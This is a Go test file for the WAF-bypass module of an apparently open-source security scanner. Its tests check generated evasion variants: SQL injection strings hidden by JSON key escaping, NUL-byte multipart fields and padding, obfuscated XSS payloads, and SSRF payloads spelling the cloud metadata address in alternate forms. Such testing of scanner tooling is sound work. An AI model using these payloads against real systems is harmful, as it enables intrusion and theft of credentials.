// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash

package wafbypass

import (
	"encoding/json"
	"net/url"
	"strings"
	"testing"
)

func attemptByName(atts []Attempt, prefix string) []Attempt {
	var out []Attempt
	for _, a := range atts {
		if strings.HasPrefix(a.Name, prefix) {
			out = append(out, a)
		}
	}
	return out
}

// TestModernJSONDifferentials covers escaped keys, Content-Type removal, and
// inspection-window padding while keeping the body valid JSON.
func TestModernJSONDifferentials(t *testing.T) {
	body := []byte(`{"id":"' OR '1'='1"}`)
	atts := BuildAttemptsForPlugin("http://example.com/api?id=1", map[string]string{
		"Content-Type": "application/json",
	}, body, "sqli-json-body-error")
	if len(atts) > MaxAttemptsForPlugin {
		t.Fatalf("attempt cap exceeded: %d", len(atts))
	}
	for _, prefix := range []string{
		"content-type-absent", "hpp-benign-first-query-id",
		"json-key-unicode-id", "waf-padding-8k-json",
	} {
		if len(attemptByName(atts, prefix)) == 0 {
			t.Fatalf("missing modern attempt %q: %+v", prefix, atts)
		}
	}
	for _, a := range attemptByName(atts, "json-key-unicode-") {
		if !json.Valid(a.Body) {
			t.Fatalf("escaped-key body must be valid JSON: %s", a.Body)
		}
		if !strings.Contains(string(a.Body), `\u0069`) {
			t.Fatalf("escaped-key body missing unicode key: %s", a.Body)
		}
	}
	for _, a := range attemptByName(atts, "waf-padding-8k-json") {
		if !json.Valid(a.Body) || !strings.HasPrefix(string(a.Body), `{"gash_pad"`) {
			t.Fatalf("padding body malformed: %s", a.Body)
		}
	}
	absent := attemptByName(atts, "content-type-absent")
	if len(absent) != 1 {
		t.Fatalf("content-type-absent count = %d", len(absent))
	}
	for k := range absent[0].Headers {
		if strings.EqualFold(k, "Content-Type") {
			t.Fatalf("Content-Type must be removed, got %q", k)
		}
	}
}

// TestModernFormDifferentials covers benign-first HPP, malformed multipart
// field names, and form padding.
func TestModernFormDifferentials(t *testing.T) {
	body := []byte(url.Values{
		"id":  {"' OR '1'='1"},
		"pad": {"x"},
	}.Encode())
	atts := BuildAttemptsForPlugin("http://example.com/api", map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	}, body, "sqli-error-based")
	for _, prefix := range []string{
		"hpp-benign-first-body-id", "multipart-field-null-id",
		"multipart-field-filename-id", "waf-padding-8k-form",
	} {
		if len(attemptByName(atts, prefix)) == 0 {
			t.Fatalf("missing form attempt %q: %+v", prefix, atts)
		}
	}
	for _, a := range attemptByName(atts, "multipart-field-null-") {
		if !strings.Contains(string(a.Body), "name=\"id\x00\"") {
			t.Fatalf("NUL field name missing: %s", a.Body)
		}
		if !strings.Contains(a.Headers["Content-Type"], "multipart/form-data") {
			t.Fatalf("multipart content type missing: %v", a.Headers)
		}
	}
	for _, a := range attemptByName(atts, "waf-padding-8k-form") {
		if !strings.HasPrefix(string(a.Body), "gash_pad=") || !strings.Contains(string(a.Body), "id=") {
			t.Fatalf("form padding malformed: %s", a.Body[:min(40, len(a.Body))])
		}
	}
}

// TestModernXSSObfuscation keeps the canary in executable contexts.
func TestModernXSSObfuscation(t *testing.T) {
	payload := `<script>alert(gash_canary_modern)</script>`
	raw := "http://example.com/?q=" + url.QueryEscape(payload)
	atts := BuildAttemptsForPlugin(raw, nil, nil, "xss-reflected-basic")
	want := []string{
		"<svg><animate onbegin=alert(gash_canary_modern)>",
		"onload=alert`gash_canary_modern`",
		"top['al'+'ert'](gash_canary_modern)",
		"data:text/html;base64,",
	}
	for _, needle := range want {
		found := false
		for _, a := range atts {
			u, err := url.Parse(a.URL)
			if err != nil {
				continue
			}
			if strings.Contains(u.Query().Get("q"), needle) {
				found = true
				break
			}
		}
		if !found {
			t.Fatalf("modern XSS variant %q missing: %+v", needle, atts)
		}
	}
}

// TestModernSSRFIPSpellings covers decimal/hex/octal/IPv6 payload hosts.
func TestModernSSRFIPSpellings(t *testing.T) {
	payload := "http://169.254.169.254/latest/meta-data/"
	raw := "http://example.com/?u=" + url.QueryEscape(payload)
	atts := BuildAttemptsForPlugin(raw, nil, nil, "ssrf-blind-oob")
	found := 0
	for _, a := range atts {
		u, err := url.Parse(a.URL)
		if err != nil {
			continue
		}
		v := u.Query().Get("u")
		for _, needle := range []string{"2852039166", "0xa9fea9fe", "0251.0376.0251.0376", "::ffff:a9fe:a9fe"} {
			if strings.Contains(v, needle) {
				found++
				break
			}
		}
	}
	if found < 2 {
		t.Fatalf("expected multiple IP spellings, got %d: %+v", found, atts)
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
